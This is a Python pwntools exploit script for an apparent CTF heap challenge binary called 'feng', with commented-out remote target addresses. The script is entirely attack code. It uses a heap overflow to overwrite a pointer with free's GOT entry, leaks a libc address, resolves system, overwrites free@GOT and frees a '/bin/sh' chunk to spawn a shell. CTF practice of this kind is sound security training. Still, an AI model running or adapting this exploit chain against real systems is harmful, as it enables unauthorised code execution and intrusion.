from pwn import *
from LibcSearcher import *
import pwnlib
p=process('./feng')
def debug():
	pwnlib.gdb.attach(p)
# p=remote('pwn.buuoj.cn',20002)
# p=remote('111.200.241.244',59942)
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='i386', log_level='debug')
# sh = process('./ret2libc164')
gdb.attach(p)

elf=ELF('./feng')
def add(size,length,text):
	p.recvuntil('Action: ')
	p.sendline('0')
	p.recvuntil(': ')
	p.sendline(str(size))
	p.recvuntil(': ')
	p.sendline('aaaa')
	p.recvuntil(': ')
	p.sendline(str(length))
	p.recvuntil(': ')
	p.sendline(text)
def dele(dex):
	p.recvuntil('Action: ')
	p.sendline('1')
	p.recvuntil(': ')
	p.sendline(str(dex))

def update(idx,length,text):
	p.recvuntil('Action: ')
	p.sendline('3')
	p.recvuntil(': ')
	p.sendline(str(idx))
	p.recvuntil(': ')
	p.sendline(str(length))
	p.recvuntil(': ')
	p.sendline(text)
def show(idx):
	p.recvuntil('Action: ')
	p.sendline('2')
	p.recvuntil(': ')
	p.sendline(str(idx))
# debug()
add(0x80,0x80,'aaa')
add(0x80,0x80,'bbb')
add(0x8,0x8,'/bin/sh')
dele(0)
pause()
add(0x100,0x19c,'a'*0x198+p32(elf.got['free']))

show(1)
free_addr=u32(p.recvuntil('\xf7')[-4:])
log.success('free-addr: '+hex(free_addr))
libc=LibcSearcher('free',free_addr)
system_addr=libc.dump('system')+free_addr-libc.dump('free')
update(1,0x4,p32(system_addr))
dele(2)
p.interactive()




